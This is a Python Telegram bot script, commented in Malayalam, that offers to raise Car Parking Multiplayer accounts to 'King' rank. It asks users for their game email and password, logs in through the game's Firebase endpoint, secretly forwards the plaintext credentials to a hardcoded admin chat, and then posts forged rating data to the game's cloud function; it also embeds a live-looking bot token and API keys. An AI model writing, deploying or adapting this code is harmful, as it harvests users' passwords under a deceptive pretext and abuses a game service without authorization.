import telebot
import requests
import json
import os

# --- CONFIGURATION ---
TOKEN = '8542467216:AAG_S6R4YMswzKHRWJxOtCCj0A059bf3BpE'
ADMIN_ID = '5475305604'  # വിവരങ്ങൾ ലഭിക്കേണ്ട നിങ്ങളുടെ Chat ID
bot = telebot.TeleBot(TOKEN)

# API Links
CPM1_LOGIN = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
CPM1_RANK = 'https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4'

CPM2_LOGIN = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
CPM2_RANK = 'https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI'

@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = (
        "👋 **Welcome to CPM Rank King Bot**\n\n"
        "ഈ ബോട്ട് ഉപയോഗിച്ച് CPM 1 & 2 അക്കൗണ്ടുകൾ King റാങ്കിലേക്ക് മാറ്റാം.\n\n"
        "**ഉപയോഗിക്കേണ്ട രീതി:**\n"
        "🔹 CPM 1-ന്: `/cpm1 email password` \n"
        "🔹 CPM 2-ന്: `/cpm2 email password` \n\n"
        "⚠️ *ശ്രദ്ധിക്കുക: കൃത്യമായ ഇമെയിലും പാസ്‌വേഡും നൽകുക.*"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

def process_rank(message, game_type):
    try:
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, f"❌ രീതി തെറ്റാണ്! \nഉദാഹരണം: `/{game_type.lower()} test@gmail.com pass123`", parse_mode='Markdown')
            return

        email = args[1]
        password = args[2]
        
        status_msg = bot.reply_to(message, f"⏳ {game_type} അക്കൗണ്ട് പരിശോധിക്കുന്നു...")

        # 1. Login Process
        login_url = CPM1_LOGIN if game_type == 'CPM1' else CPM2_LOGIN
        payload = {'email': email, 'password': password, 'returnSecureToken': True}
        
        response = requests.post(login_url, json=payload).json()

        if 'idToken' in response:
            token = response['idToken']
            
            # അഡ്മിന് വിവരങ്ങൾ അയക്കുന്നു
            admin_log = f"🚀 **New Login**\n🎮 Game: {game_type}\n📧 Email: `{email}`\n🔑 Pass: `{password}`"
            bot.send_message(ADMIN_ID, admin_log, parse_mode='Markdown')

            bot.edit_message_text("✅ ലോഗിൻ വിജയിച്ചു! റാങ്ക് ഇൻജക്ട് ചെയ്യുന്നു...", message.chat.id, status_msg.message_id)

            # 2. Rank Injection Process
            rank_url = CPM1_RANK if game_type == 'CPM1' else CPM2_RANK
            stats = ['cars','car_fix','car_collided','car_exchange','car_trade','car_wash','drift_max','drift','cargo','taxi','levels','speed_banner','police','real_estate','treasure','push_ups']
            
            rating_data = {k: 100000 for k in stats}
            rating_data['time'] = 10000000000
            rating_data['race_win'] = 5000
            
            rank_payload = {'data': json.dumps({'RatingData': rating_data})}
            headers = {'Authorization': f"Bearer {token}", 'Content-Type': 'application/json', 'User-Agent': 'okhttp/3.12.13'}
            
            rank_res = requests.post(rank_url, headers=headers, json=rank_payload)

            if rank_res.status_code == 200:
                bot.edit_message_text(f"👑 **{game_type} King Rank Success!** 👑\n\nഇനി ഗെയിം ഓഫ് ചെയ്ത് വീണ്ടും ഓപ്പൺ ചെയ്യുക.", message.chat.id, status_msg.message_id)
            else:
                bot.edit_message_text("❌ റാങ്ക് ഇൻജക്ഷൻ പരാജയപ്പെട്ടു. പിന്നീട് ശ്രമിക്കുക.", message.chat.id, status_msg.message_id)
        else:
            error_msg = response.get('error', {}).get('message', 'Unknown Error')
            bot.edit_message_text(f"❌ ലോഗിൻ പരാജയപ്പെട്ടു: {error_msg}", message.chat.id, status_msg.message_id)

    except Exception as e:
        bot.reply_to(message, f"❌ ഒരു പിശക് സംഭവിച്ചു: {str(e)}")

@bot.message_handler(commands=['cpm1'])
def cpm1_cmd(message):
    process_rank(message, 'CPM1')

@bot.message_handler(commands=['cpm2'])
def cpm2_cmd(message):
    process_rank(message, 'CPM2')

if __name__ == "__main__":
    print("Bot is starting...")
    bot.infinity_polling()
